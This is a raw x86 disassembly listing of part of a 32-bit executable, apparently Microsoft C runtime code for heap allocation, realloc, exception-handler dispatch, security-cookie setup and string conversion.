  427194:	je     0x42729b
  42719a:	mov    ecx,DWORD PTR [edx+0x4]
  42719d:	cmp    ecx,DWORD PTR [edx+0x8]
  4271a0:	jne    0x4271fe
  4271a2:	cmp    edi,0x20
  4271a5:	mov    ebx,0x80000000
  4271aa:	jge    0x4271d2
  4271ac:	mov    ecx,edi
  4271ae:	shr    ebx,cl
  4271b0:	mov    ecx,DWORD PTR [ebp-0x4]
  4271b3:	lea    edi,[eax+edi*1+0x4]
  4271b7:	not    ebx
  4271b9:	mov    DWORD PTR [ebp-0x14],ebx
  4271bc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4271c0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4271c4:	dec    BYTE PTR [edi]
  4271c6:	jne    0x4271fb
  4271c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4271cb:	mov    ebx,DWORD PTR [ebp+0x8]
  4271ce:	and    DWORD PTR [ebx],ecx
  4271d0:	jmp    0x4271fe
  4271d2:	lea    ecx,[edi-0x20]
  4271d5:	shr    ebx,cl
  4271d7:	mov    ecx,DWORD PTR [ebp-0x4]
  4271da:	lea    ecx,[eax+ecx*4+0xc4]
  4271e1:	lea    edi,[eax+edi*1+0x4]
  4271e5:	not    ebx
  4271e7:	and    DWORD PTR [ecx],ebx
  4271e9:	dec    BYTE PTR [edi]
  4271eb:	mov    DWORD PTR [ebp-0x14],ebx
  4271ee:	jne    0x4271fb
  4271f0:	mov    ebx,DWORD PTR [ebp+0x8]
  4271f3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271f6:	and    DWORD PTR [ebx+0x4],ecx
  4271f9:	jmp    0x4271fe
  4271fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4271fe:	cmp    DWORD PTR [ebp-0x8],0x0
  427202:	mov    ecx,DWORD PTR [edx+0x8]
  427205:	mov    edi,DWORD PTR [edx+0x4]
  427208:	mov    DWORD PTR [ecx+0x4],edi
  42720b:	mov    ecx,DWORD PTR [edx+0x4]
  42720e:	mov    edi,DWORD PTR [edx+0x8]
  427211:	mov    DWORD PTR [ecx+0x8],edi
  427214:	je     0x4272a7
  42721a:	mov    ecx,DWORD PTR [ebp-0xc]
  42721d:	lea    ecx,[ecx+esi*8]
  427220:	mov    edi,DWORD PTR [ecx+0x4]
  427223:	mov    DWORD PTR [edx+0x8],ecx
  427226:	mov    DWORD PTR [edx+0x4],edi
  427229:	mov    DWORD PTR [ecx+0x4],edx
  42722c:	mov    ecx,DWORD PTR [edx+0x4]
  42722f:	mov    DWORD PTR [ecx+0x8],edx
  427232:	mov    ecx,DWORD PTR [edx+0x4]
  427235:	cmp    ecx,DWORD PTR [edx+0x8]
  427238:	jne    0x427298
  42723a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42723e:	mov    BYTE PTR [ebp+0xb],cl
  427241:	inc    cl
  427243:	cmp    esi,0x20
  427246:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42724a:	jge    0x42726f
  42724c:	cmp    BYTE PTR [ebp+0xb],0x0
  427250:	jne    0x42725d
  427252:	mov    edi,0x80000000
  427257:	mov    ecx,esi
  427259:	shr    edi,cl
  42725b:	or     DWORD PTR [ebx],edi
  42725d:	mov    ecx,esi
  42725f:	mov    edi,0x80000000
  427264:	shr    edi,cl
  427266:	mov    ecx,DWORD PTR [ebp-0x4]
  427269:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42726d:	jmp    0x427298
  42726f:	cmp    BYTE PTR [ebp+0xb],0x0
  427273:	jne    0x427282
  427275:	lea    ecx,[esi-0x20]
  427278:	mov    edi,0x80000000
  42727d:	shr    edi,cl
  42727f:	or     DWORD PTR [ebx+0x4],edi
  427282:	mov    ecx,DWORD PTR [ebp-0x4]
  427285:	lea    edi,[eax+ecx*4+0xc4]
  42728c:	lea    ecx,[esi-0x20]
  42728f:	mov    esi,0x80000000
  427294:	shr    esi,cl
  427296:	or     DWORD PTR [edi],esi
  427298:	mov    ecx,DWORD PTR [ebp-0x8]
  42729b:	test   ecx,ecx
  42729d:	je     0x4272aa
  42729f:	mov    DWORD PTR [edx],ecx
  4272a1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4272a5:	jmp    0x4272aa
  4272a7:	mov    ecx,DWORD PTR [ebp-0x8]
  4272aa:	mov    esi,DWORD PTR [ebp-0x10]
  4272ad:	add    edx,ecx
  4272af:	lea    ecx,[esi+0x1]
  4272b2:	mov    DWORD PTR [edx],ecx
  4272b4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4272b8:	mov    esi,DWORD PTR [ebp-0xc]
  4272bb:	mov    ecx,DWORD PTR [esi]
  4272bd:	test   ecx,ecx
  4272bf:	lea    edi,[ecx+0x1]
  4272c2:	mov    DWORD PTR [esi],edi
  4272c4:	jne    0x4272e0
  4272c6:	cmp    ebx,DWORD PTR ds:0x4639f8
  4272cc:	jne    0x4272e0
  4272ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4272d1:	cmp    ecx,DWORD PTR ds:0x463a10
  4272d7:	jne    0x4272e0
  4272d9:	and    DWORD PTR ds:0x4639f8,0x0
  4272e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4272e3:	mov    DWORD PTR [eax],ecx
  4272e5:	lea    eax,[edx+0x4]
  4272e8:	pop    edi
  4272e9:	pop    esi
  4272ea:	pop    ebx
  4272eb:	leave  
  4272ec:	ret    
  4272ed:	int3   
  4272ee:	int3   
  4272ef:	int3   
  4272f0:	push   esi
  4272f1:	inc    ebx
  4272f2:	xor    dh,BYTE PTR [eax]
  4272f4:	pop    eax
  4272f5:	inc    ebx
  4272f6:	xor    BYTE PTR [eax],dh
  4272f8:	push   ebp
  4272f9:	mov    ebp,esp
  4272fb:	sub    esp,0x8
  4272fe:	push   ebx
  4272ff:	push   esi
  427300:	push   edi
  427301:	push   ebp
  427302:	cld    
  427303:	mov    ebx,DWORD PTR [ebp+0xc]
  427306:	mov    eax,DWORD PTR [ebp+0x8]
  427309:	test   DWORD PTR [eax+0x4],0x6
  427310:	jne    0x427398
  427316:	mov    DWORD PTR [ebp-0x8],eax
  427319:	mov    eax,DWORD PTR [ebp+0x10]
  42731c:	mov    DWORD PTR [ebp-0x4],eax
  42731f:	lea    eax,[ebp-0x8]
  427322:	mov    DWORD PTR [ebx-0x4],eax
  427325:	mov    esi,DWORD PTR [ebx+0xc]
  427328:	mov    edi,DWORD PTR [ebx+0x8]
  42732b:	cmp    esi,0xffffffff
  42732e:	je     0x427391
  427330:	lea    ecx,[esi+esi*2]
  427333:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427338:	je     0x42737f
  42733a:	push   esi
  42733b:	push   ebp
  42733c:	lea    ebp,[ebx+0x10]
  42733f:	call   DWORD PTR [edi+ecx*4+0x4]
  427343:	pop    ebp
  427344:	pop    esi
  427345:	mov    ebx,DWORD PTR [ebp+0xc]
  427348:	or     eax,eax
  42734a:	je     0x42737f
  42734c:	js     0x42738a
  42734e:	mov    edi,DWORD PTR [ebx+0x8]
  427351:	push   ebx
  427352:	call   0x428280
  427357:	add    esp,0x4
  42735a:	lea    ebp,[ebx+0x10]
  42735d:	push   esi
  42735e:	push   ebx
  42735f:	call   0x4282c2
  427364:	add    esp,0x8
  427367:	lea    ecx,[esi+esi*2]
  42736a:	push   0x1
  42736c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427370:	call   0x428356
  427375:	mov    eax,DWORD PTR [edi+ecx*4]
  427378:	mov    DWORD PTR [ebx+0xc],eax
  42737b:	call   DWORD PTR [edi+ecx*4+0x8]
  42737f:	mov    edi,DWORD PTR [ebx+0x8]
  427382:	lea    ecx,[esi+esi*2]
  427385:	mov    esi,DWORD PTR [edi+ecx*4]
  427388:	jmp    0x42732b
  42738a:	mov    eax,0x0
  42738f:	jmp    0x4273ad
  427391:	mov    eax,0x1
  427396:	jmp    0x4273ad
  427398:	push   ebp
  427399:	lea    ebp,[ebx+0x10]
  42739c:	push   0xffffffff
  42739e:	push   ebx
  42739f:	call   0x4282c2
  4273a4:	add    esp,0x8
  4273a7:	pop    ebp
  4273a8:	mov    eax,0x1
  4273ad:	pop    ebp
  4273ae:	pop    edi
  4273af:	pop    esi
  4273b0:	pop    ebx
  4273b1:	mov    esp,ebp
  4273b3:	pop    ebp
  4273b4:	ret    
  4273b5:	push   ebp
  4273b6:	mov    ecx,DWORD PTR [esp+0x8]
  4273ba:	mov    ebp,DWORD PTR [ecx]
  4273bc:	mov    eax,DWORD PTR [ecx+0x1c]
  4273bf:	push   eax
  4273c0:	mov    eax,DWORD PTR [ecx+0x18]
  4273c3:	push   eax
  4273c4:	call   0x4282c2
  4273c9:	add    esp,0x8
  4273cc:	pop    ebp
  4273cd:	ret    0x4
  4273d0:	call   0x4252e9
  4273d5:	add    eax,0x8
  4273d8:	ret    
  4273d9:	push   0x14
  4273db:	push   0x4298c0
  4273e0:	call   0x425434
  4273e5:	mov    edi,DWORD PTR [ebp+0x8]
  4273e8:	xor    ebx,ebx
  4273ea:	cmp    edi,ebx
  4273ec:	jne    0x4273fc
  4273ee:	push   DWORD PTR [ebp+0xc]
  4273f1:	call   0x426152
  4273f6:	pop    ecx
  4273f7:	jmp    0x427580
  4273fc:	mov    esi,DWORD PTR [ebp+0xc]
  4273ff:	cmp    esi,ebx
  427401:	jne    0x42740f
  427403:	push   edi
  427404:	call   0x42603a
  427409:	pop    ecx
  42740a:	jmp    0x42757e
  42740f:	cmp    DWORD PTR ds:0x463c44,0x3
  427416:	jne    0x42754a
  42741c:	mov    DWORD PTR [ebp-0x1c],ebx
  42741f:	cmp    esi,0xffffffe0
  427422:	ja     0x427519
  427428:	push   0x4
  42742a:	call   0x4255ef
  42742f:	pop    ecx
  427430:	mov    DWORD PTR [ebp-0x4],ebx
  427433:	push   edi
  427434:	call   0x426812
  427439:	pop    ecx
  42743a:	mov    DWORD PTR [ebp-0x20],eax
  42743d:	cmp    eax,ebx
  42743f:	je     0x4274e9
  427445:	cmp    esi,DWORD PTR ds:0x463a04
  42744b:	ja     0x427499
  42744d:	push   esi
  42744e:	push   edi
  42744f:	push   eax
  427450:	call   0x426d12
  427455:	add    esp,0xc
  427458:	test   eax,eax
  42745a:	je     0x427461
  42745c:	mov    DWORD PTR [ebp-0x1c],edi
  42745f:	jmp    0x427499
  427461:	push   esi
  427462:	call   0x426ff1
  427467:	pop    ecx
  427468:	mov    DWORD PTR [ebp-0x1c],eax
  42746b:	cmp    eax,ebx
  42746d:	je     0x427499
  42746f:	mov    eax,DWORD PTR [edi-0x4]
  427472:	dec    eax
  427473:	mov    DWORD PTR [ebp-0x24],eax
  427476:	cmp    eax,esi
  427478:	jb     0x42747c
  42747a:	mov    eax,esi
  42747c:	push   eax
  42747d:	push   edi
  42747e:	push   DWORD PTR [ebp-0x1c]
  427481:	call   0x426170
  427486:	push   edi
  427487:	call   0x426812
  42748c:	mov    DWORD PTR [ebp-0x20],eax
  42748f:	push   edi
  427490:	push   eax
  427491:	call   0x42683d
  427496:	add    esp,0x18
  427499:	cmp    DWORD PTR [ebp-0x1c],ebx
  42749c:	jne    0x4274e9
  42749e:	cmp    esi,ebx
  4274a0:	jne    0x4274a8
  4274a2:	xor    esi,esi
  4274a4:	inc    esi
  4274a5:	mov    DWORD PTR [ebp+0xc],esi
  4274a8:	add    esi,0xf
  4274ab:	and    esi,0xfffffff0
  4274ae:	mov    DWORD PTR [ebp+0xc],esi
  4274b1:	push   esi
  4274b2:	push   ebx
  4274b3:	push   DWORD PTR ds:0x463c40
  4274b9:	call   DWORD PTR ds:0x429038
  4274bf:	mov    DWORD PTR [ebp-0x1c],eax
  4274c2:	cmp    eax,ebx
  4274c4:	je     0x4274e9
  4274c6:	mov    eax,DWORD PTR [edi-0x4]
  4274c9:	dec    eax
  4274ca:	mov    DWORD PTR [ebp-0x24],eax
  4274cd:	cmp    eax,esi
  4274cf:	jb     0x4274d3
  4274d1:	mov    eax,esi
  4274d3:	push   eax
  4274d4:	push   edi
  4274d5:	push   DWORD PTR [ebp-0x1c]
  4274d8:	call   0x426170
  4274dd:	push   edi
  4274de:	push   DWORD PTR [ebp-0x20]
  4274e1:	call   0x42683d
  4274e6:	add    esp,0x14
  4274e9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ed:	call   0x427541
  4274f2:	cmp    DWORD PTR [ebp-0x20],ebx
  4274f5:	jne    0x427519
  4274f7:	cmp    esi,ebx
  4274f9:	jne    0x4274fe
  4274fb:	xor    esi,esi
  4274fd:	inc    esi
  4274fe:	add    esi,0xf
  427501:	and    esi,0xfffffff0
  427504:	mov    DWORD PTR [ebp+0xc],esi
  427507:	push   esi
  427508:	push   edi
  427509:	push   ebx
  42750a:	push   DWORD PTR ds:0x463c40
  427510:	call   DWORD PTR ds:0x42910c
  427516:	mov    DWORD PTR [ebp-0x1c],eax
  427519:	mov    eax,DWORD PTR [ebp-0x1c]
  42751c:	cmp    eax,ebx
  42751e:	jne    0x427580
  427520:	cmp    DWORD PTR ds:0x4638c8,ebx
  427526:	je     0x427580
  427528:	push   esi
  427529:	call   0x427d12
  42752e:	pop    ecx
  42752f:	test   eax,eax
  427531:	jne    0x42741c
  427537:	jmp    0x42757e
  427539:	xor    ebx,ebx
  42753b:	mov    esi,DWORD PTR [ebp+0xc]
  42753e:	mov    edi,DWORD PTR [ebp+0x8]
  427541:	push   0x4
  427543:	call   0x42555b
  427548:	pop    ecx
  427549:	ret    
  42754a:	xor    eax,eax
  42754c:	cmp    esi,0xffffffe0
  42754f:	ja     0x427567
  427551:	cmp    esi,ebx
  427553:	jne    0x427558
  427555:	xor    esi,esi
  427557:	inc    esi
  427558:	push   esi
  427559:	push   edi
  42755a:	push   ebx
  42755b:	push   DWORD PTR ds:0x463c40
  427561:	call   DWORD PTR ds:0x42910c
  427567:	cmp    eax,ebx
  427569:	jne    0x427580
  42756b:	cmp    DWORD PTR ds:0x4638c8,ebx
  427571:	je     0x427580
  427573:	push   esi
  427574:	call   0x427d12
  427579:	pop    ecx
  42757a:	test   eax,eax
  42757c:	jne    0x42754a
  42757e:	xor    eax,eax
  427580:	call   0x42546f
  427585:	ret    
  427586:	push   0x10
  427588:	push   0x4298d0
  42758d:	call   0x425434
  427592:	cmp    DWORD PTR ds:0x463c44,0x3
  427599:	jne    0x4275d5
  42759b:	push   0x4
  42759d:	call   0x4255ef
  4275a2:	pop    ecx
  4275a3:	and    DWORD PTR [ebp-0x4],0x0
  4275a7:	mov    esi,DWORD PTR [ebp+0x8]
  4275aa:	push   esi
  4275ab:	call   0x426812
  4275b0:	pop    ecx
  4275b1:	mov    DWORD PTR [ebp-0x1c],eax
  4275b4:	test   eax,eax
  4275b6:	je     0x4275c3
  4275b8:	mov    esi,DWORD PTR [esi-0x4]
  4275bb:	sub    esi,0x9
  4275be:	mov    DWORD PTR [ebp-0x20],esi
  4275c1:	jmp    0x4275c6
  4275c3:	mov    esi,DWORD PTR [ebp-0x20]
  4275c6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275ca:	call   0x4275f3
  4275cf:	cmp    DWORD PTR [ebp-0x1c],0x0
  4275d3:	jne    0x4275e8
  4275d5:	push   DWORD PTR [ebp+0x8]
  4275d8:	push   0x0
  4275da:	push   DWORD PTR ds:0x463c40
  4275e0:	call   DWORD PTR ds:0x429110
  4275e6:	mov    esi,eax
  4275e8:	mov    eax,esi
  4275ea:	call   0x42546f
  4275ef:	ret    
  4275f0:	mov    esi,DWORD PTR [ebp-0x20]
  4275f3:	push   0x4
  4275f5:	call   0x42555b
  4275fa:	pop    ecx
  4275fb:	ret    
  4275fc:	push   ebp
  4275fd:	mov    ebp,esp
  4275ff:	sub    esp,0x10
  427602:	push   esi
  427603:	lea    eax,[ebp-0x8]
  427606:	push   eax
  427607:	call   DWORD PTR ds:0x429120
  42760d:	mov    esi,DWORD PTR [ebp-0x4]
  427610:	xor    esi,DWORD PTR [ebp-0x8]
  427613:	call   DWORD PTR ds:0x42911c
  427619:	xor    esi,eax
  42761b:	call   DWORD PTR ds:0x4290d8
  427621:	xor    esi,eax
  427623:	call   DWORD PTR ds:0x429118
  427629:	xor    esi,eax
  42762b:	lea    eax,[ebp-0x10]
  42762e:	push   eax
  42762f:	call   DWORD PTR ds:0x429114
  427635:	mov    eax,DWORD PTR [ebp-0xc]
  427638:	xor    eax,DWORD PTR [ebp-0x10]
  42763b:	xor    esi,eax
  42763d:	mov    DWORD PTR ds:0x462f30,esi
  427643:	jne    0x42764f
  427645:	mov    DWORD PTR ds:0x462f30,0xbb40e64e
  42764f:	pop    esi
  427650:	leave  
  427651:	ret    
  427652:	push   0x118
  427657:	push   0x429a80
  42765c:	call   0x425434
  427661:	mov    eax,ds:0x462f30
  427666:	xor    eax,DWORD PTR [ebp+0x4]
  427669:	mov    DWORD PTR [ebp-0x1c],eax
  42766c:	mov    eax,ds:0x463898
  427671:	xor    ecx,ecx
  427673:	cmp    eax,ecx
  427675:	je     0x427696
  427677:	mov    DWORD PTR [ebp-0x4],ecx
  42767a:	push   DWORD PTR [ebp+0xc]
  42767d:	push   DWORD PTR [ebp+0x8]
  427680:	call   eax
  427682:	pop    ecx
  427683:	pop    ecx
  427684:	or     DWORD PTR [ebp-0x4],0xffffffff
  427688:	jmp    0x427794
  42768d:	xor    eax,eax
  42768f:	inc    eax
  427690:	ret    
  427691:	mov    esp,DWORD PTR [ebp-0x18]
  427694:	jmp    0x427684
  427696:	mov    eax,DWORD PTR [ebp+0x8]
  427699:	dec    eax
  42769a:	je     0x4276af
  42769c:	mov    edi,0x429a5c
  4276a1:	mov    DWORD PTR [ebp-0x20],0x4299a8
  4276a8:	mov    esi,0xd4
  4276ad:	jmp    0x4276c0
  4276af:	mov    edi,0x429988
  4276b4:	mov    DWORD PTR [ebp-0x20],0x4298e8
  4276bb:	mov    esi,0xb9
  4276c0:	mov    BYTE PTR [ebp-0x24],cl
  4276c3:	push   0x104
  4276c8:	lea    eax,[ebp-0x128]
  4276ce:	push   eax
  4276cf:	push   ecx
  4276d0:	call   DWORD PTR ds:0x4290a8
  4276d6:	test   eax,eax
  4276d8:	jne    0x4276ed
  4276da:	push   0x4295dc
  4276df:	lea    eax,[ebp-0x128]
  4276e5:	push   eax
  4276e6:	call   0x425810
  4276eb:	pop    ecx
  4276ec:	pop    ecx
  4276ed:	lea    ebx,[ebp-0x128]
  4276f3:	lea    eax,[ebp-0x128]
  4276f9:	push   eax
  4276fa:	call   0x425a40
  4276ff:	pop    ecx
  427700:	add    eax,0xb
  427703:	cmp    eax,0x3c
  427706:	jbe    0x427731
  427708:	lea    eax,[ebp-0x128]
  42770e:	push   eax
  42770f:	call   0x425a40
  427714:	mov    ebx,eax
  427716:	lea    eax,[ebp-0x128]
  42771c:	sub    eax,0x31
  42771f:	add    ebx,eax
  427721:	push   0x3
  427723:	push   0x4295d8
  427728:	push   ebx
  427729:	call   0x425910
  42772e:	add    esp,0x10
  427731:	push   ebx
  427732:	call   0x425a40
  427737:	pop    ecx
  427738:	lea    eax,[eax+esi*1+0xc]
  42773c:	add    eax,0x3
  42773f:	and    eax,0xfffffffc
  427742:	call   0x425480
  427747:	mov    DWORD PTR [ebp-0x18],esp
  42774a:	mov    esi,esp
  42774c:	push   edi
  42774d:	push   esi
  42774e:	call   0x425810
  427753:	mov    edi,0x4295b8
  427758:	push   edi
  427759:	push   esi
  42775a:	call   0x425820
  42775f:	push   0x4298dc
  427764:	push   esi
  427765:	call   0x425820
  42776a:	push   ebx
  42776b:	push   esi
  42776c:	call   0x425820
  427771:	push   edi
  427772:	push   esi
  427773:	call   0x425820
  427778:	push   DWORD PTR [ebp-0x20]
  42777b:	push   esi
  42777c:	call   0x425820
  427781:	push   0x12010
  427786:	push   0x429590
  42778b:	push   esi
  42778c:	call   0x425712
  427791:	add    esp,0x3c
  427794:	push   0x3
  427796:	call   0x4248a2
  42779b:	int3   
  42779c:	push   0x38
  42779e:	push   0x429ea0
  4277a3:	call   0x425434
  4277a8:	xor    ebx,ebx
  4277aa:	cmp    DWORD PTR ds:0x4638bc,ebx
  4277b0:	jne    0x4277ea
  4277b2:	push   ebx
  4277b3:	push   ebx
  4277b4:	xor    esi,esi
  4277b6:	inc    esi
  4277b7:	push   esi
  4277b8:	push   0x429e9c
  4277bd:	push   0x100
  4277c2:	push   ebx
  4277c3:	call   DWORD PTR ds:0x42912c
  4277c9:	test   eax,eax
  4277cb:	je     0x4277d5
  4277cd:	mov    DWORD PTR ds:0x4638bc,esi
  4277d3:	jmp    0x4277ea
  4277d5:	call   DWORD PTR ds:0x429030
  4277db:	cmp    eax,0x78
  4277de:	jne    0x4277ea
  4277e0:	mov    DWORD PTR ds:0x4638bc,0x2
  4277ea:	cmp    DWORD PTR [ebp+0x14],ebx
  4277ed:	jle    0x42780a
  4277ef:	mov    ecx,DWORD PTR [ebp+0x14]
  4277f2:	mov    eax,DWORD PTR [ebp+0x10]
  4277f5:	dec    ecx
  4277f6:	cmp    BYTE PTR [eax],bl
  4277f8:	je     0x427802
  4277fa:	inc    eax
  4277fb:	cmp    ecx,ebx
  4277fd:	jne    0x4277f5
  4277ff:	or     ecx,0xffffffff
  427802:	or     eax,0xffffffff
  427805:	sub    eax,ecx
  427807:	add    DWORD PTR [ebp+0x14],eax
  42780a:	mov    eax,ds:0x4638bc
  42780f:	cmp    eax,0x2
  427812:	je     0x4279f4
  427818:	cmp    eax,ebx
  42781a:	je     0x4279f4
  427820:	cmp    eax,0x1
  427823:	jne    0x427a27
  427829:	xor    edi,edi
  42782b:	mov    DWORD PTR [ebp-0x1c],edi
  42782e:	mov    DWORD PTR [ebp-0x20],ebx
  427831:	mov    DWORD PTR [ebp-0x24],ebx
  427834:	cmp    DWORD PTR [ebp+0x20],ebx
  427837:	jne    0x427841
  427839:	mov    eax,ds:0x4638b4
  42783e:	mov    DWORD PTR [ebp+0x20],eax
  427841:	push   ebx
  427842:	push   ebx
  427843:	push   DWORD PTR [ebp+0x14]
  427846:	push   DWORD PTR [ebp+0x10]
  427849:	xor    eax,eax
  42784b:	cmp    DWORD PTR [ebp+0x24],ebx
  42784e:	setne  al
  427851:	lea    eax,[eax*8+0x1]
  427858:	push   eax
  427859:	push   DWORD PTR [ebp+0x20]
  42785c:	call   DWORD PTR ds:0x429128
  427862:	mov    esi,eax
  427864:	mov    DWORD PTR [ebp-0x28],esi
  427867:	cmp    esi,ebx
  427869:	je     0x427a27
  42786f:	mov    DWORD PTR [ebp-0x4],0x1
  427876:	lea    eax,[esi+esi*1]
  427879:	add    eax,0x3
  42787c:	and    eax,0xfffffffc
  42787f:	call   0x425480
  427884:	mov    DWORD PTR [ebp-0x18],esp
  427887:	mov    eax,esp
  427889:	mov    DWORD PTR [ebp-0x2c],eax
  42788c:	or     DWORD PTR [ebp-0x4],0xffffffff
  427890:	jmp    0x4278ad
  427892:	xor    eax,eax
  427894:	inc    eax
  427895:	ret    
  427896:	mov    esp,DWORD PTR [ebp-0x18]
  427899:	call   0x4288c5
  42789e:	xor    ebx,ebx
  4278a0:	mov    DWORD PTR [ebp-0x2c],ebx
  4278a3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4278a7:	mov    edi,DWORD PTR [ebp-0x1c]
  4278aa:	mov    esi,DWORD PTR [ebp-0x28]
  4278ad:	cmp    DWORD PTR [ebp-0x2c],ebx
  4278b0:	jne    0x4278ce
  4278b2:	lea    eax,[esi+esi*1]
  4278b5:	push   eax
  4278b6:	call   0x426152
  4278bb:	pop    ecx
  4278bc:	mov    DWORD PTR [ebp-0x2c],eax
  4278bf:	cmp    eax,ebx
  4278c1:	je     0x427a27
  4278c7:	mov    DWORD PTR [ebp-0x20],0x1
  4278ce:	push   esi
  4278cf:	push   DWORD PTR [ebp-0x2c]
  4278d2:	push   DWORD PTR [ebp+0x14]
  4278d5:	push   DWORD PTR [ebp+0x10]
  4278d8:	push   0x1
  4278da:	push   DWORD PTR [ebp+0x20]
  4278dd:	call   DWORD PTR ds:0x429128
  4278e3:	test   eax,eax
  4278e5:	je     0x4279d1
  4278eb:	push   ebx
  4278ec:	push   ebx
  4278ed:	push   esi
  4278ee:	push   DWORD PTR [ebp-0x2c]
  4278f1:	push   DWORD PTR [ebp+0xc]
  4278f4:	push   DWORD PTR [ebp+0x8]
  4278f7:	call   DWORD PTR ds:0x42912c
  4278fd:	mov    edi,eax
  4278ff:	mov    DWORD PTR [ebp-0x1c],edi
  427902:	cmp    edi,ebx
  427904:	je     0x4279d1
  42790a:	test   BYTE PTR [ebp+0xd],0x4
  42790e:	je     0x42793d
  427910:	cmp    DWORD PTR [ebp+0x1c],ebx
  427913:	je     0x4279d1
  427919:	cmp    edi,DWORD PTR [ebp+0x1c]
  42791c:	jg     0x4279d1
  427922:	push   DWORD PTR [ebp+0x1c]
  427925:	push   DWORD PTR [ebp+0x18]
  427928:	push   esi
  427929:	push   DWORD PTR [ebp-0x2c]
  42792c:	push   DWORD PTR [ebp+0xc]
  42792f:	push   DWORD PTR [ebp+0x8]
  427932:	call   DWORD PTR ds:0x42912c
  427938:	jmp    0x4279d1
  42793d:	mov    DWORD PTR [ebp-0x4],0x2
  427944:	lea    eax,[edi+edi*1]
  427947:	add    eax,0x3
  42794a:	and    eax,0xfffffffc
  42794d:	call   0x425480
  427952:	mov    DWORD PTR [ebp-0x18],esp
  427955:	mov    eax,esp
  427957:	mov    DWORD PTR [ebp-0x30],eax
  42795a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42795e:	jmp    0x42797b
  427960:	xor    eax,eax
  427962:	inc    eax
  427963:	ret    
  427964:	mov    esp,DWORD PTR [ebp-0x18]
  427967:	call   0x4288c5
  42796c:	xor    ebx,ebx
  42796e:	mov    DWORD PTR [ebp-0x30],ebx
  427971:	or     DWORD PTR [ebp-0x4],0xffffffff
  427975:	mov    edi,DWORD PTR [ebp-0x1c]
  427978:	mov    esi,DWORD PTR [ebp-0x28]
  42797b:	cmp    DWORD PTR [ebp-0x30],ebx
  42797e:	jne    0x427998
  427980:	lea    eax,[edi+edi*1]
  427983:	push   eax
  427984:	call   0x426152
  427989:	pop    ecx
  42798a:	mov    DWORD PTR [ebp-0x30],eax
  42798d:	cmp    eax,ebx
  42798f:	je     0x4279d1
  427991:	mov    DWORD PTR [ebp-0x24],0x1
  427998:	push   edi
  427999:	push   DWORD PTR [ebp-0x30]
  42799c:	push   esi
  42799d:	push   DWORD PTR [ebp-0x2c]
  4279a0:	push   DWORD PTR [ebp+0xc]
  4279a3:	push   DWORD PTR [ebp+0x8]
  4279a6:	call   DWORD PTR ds:0x42912c
  4279ac:	test   eax,eax
  4279ae:	je     0x4279d1
  4279b0:	push   ebx
  4279b1:	push   ebx
  4279b2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4279b5:	jne    0x4279bb
  4279b7:	push   ebx
  4279b8:	push   ebx
  4279b9:	jmp    0x4279c1
  4279bb:	push   DWORD PTR [ebp+0x1c]
  4279be:	push   DWORD PTR [ebp+0x18]
  4279c1:	push   edi
  4279c2:	push   DWORD PTR [ebp-0x30]
  4279c5:	push   ebx
  4279c6:	push   DWORD PTR [ebp+0x20]
  4279c9:	call   DWORD PTR ds:0x4290bc
  4279cf:	mov    edi,eax
  4279d1:	cmp    DWORD PTR [ebp-0x24],ebx
  4279d4:	je     0x4279df
  4279d6:	push   DWORD PTR [ebp-0x30]
  4279d9:	call   0x42603a
  4279de:	pop    ecx
  4279df:	cmp    DWORD PTR [ebp-0x20],ebx
  4279e2:	je     0x4279ed
  4279e4:	push   DWORD PTR [ebp-0x2c]
  4279e7:	call   0x42603a
  4279ec:	pop    ecx
  4279ed:	mov    eax,edi
  4279ef:	jmp    0x427b4f
  4279f4:	mov    DWORD PTR [ebp-0x34],ebx
  4279f7:	xor    edi,edi
  4279f9:	mov    DWORD PTR [ebp-0x38],ebx
  4279fc:	cmp    DWORD PTR [ebp+0x8],ebx
  4279ff:	jne    0x427a09
  427a01:	mov    eax,ds:0x4638a4
  427a06:	mov    DWORD PTR [ebp+0x8],eax
  427a09:	cmp    DWORD PTR [ebp+0x20],ebx
  427a0c:	jne    0x427a16
  427a0e:	mov    eax,ds:0x4638b4
  427a13:	mov    DWORD PTR [ebp+0x20],eax
  427a16:	push   DWORD PTR [ebp+0x8]
  427a19:	call   0x4286ad
  427a1e:	pop    ecx
  427a1f:	mov    DWORD PTR [ebp-0x3c],eax
  427a22:	cmp    eax,0xffffffff
  427a25:	jne    0x427a2e
  427a27:	xor    eax,eax
  427a29:	jmp    0x427b4f
  427a2e:	cmp    eax,DWORD PTR [ebp+0x20]
  427a31:	je     0x427b25
  427a37:	push   ebx
  427a38:	push   ebx
  427a39:	lea    ecx,[ebp+0x14]
  427a3c:	push   ecx
  427a3d:	push   DWORD PTR [ebp+0x10]
  427a40:	push   eax
  427a41:	push   DWORD PTR [ebp+0x20]
  427a44:	call   0x4286f6
  427a49:	add    esp,0x18
  427a4c:	mov    DWORD PTR [ebp-0x34],eax
  427a4f:	cmp    eax,ebx
  427a51:	je     0x427a27
  427a53:	push   ebx
  427a54:	push   ebx
  427a55:	push   DWORD PTR [ebp+0x14]
  427a58:	push   eax
  427a59:	push   DWORD PTR [ebp+0xc]
  427a5c:	push   DWORD PTR [ebp+0x8]
  427a5f:	call   DWORD PTR ds:0x429124
  427a65:	mov    esi,eax
  427a67:	mov    DWORD PTR [ebp-0x40],esi
  427a6a:	cmp    esi,ebx
  427a6c:	je     0x427b14
  427a72:	mov    DWORD PTR [ebp-0x4],ebx
  427a75:	add    eax,0x3
  427a78:	and    eax,0xfffffffc
  427a7b:	call   0x425480
  427a80:	mov    DWORD PTR [ebp-0x18],esp
  427a83:	mov    edi,esp
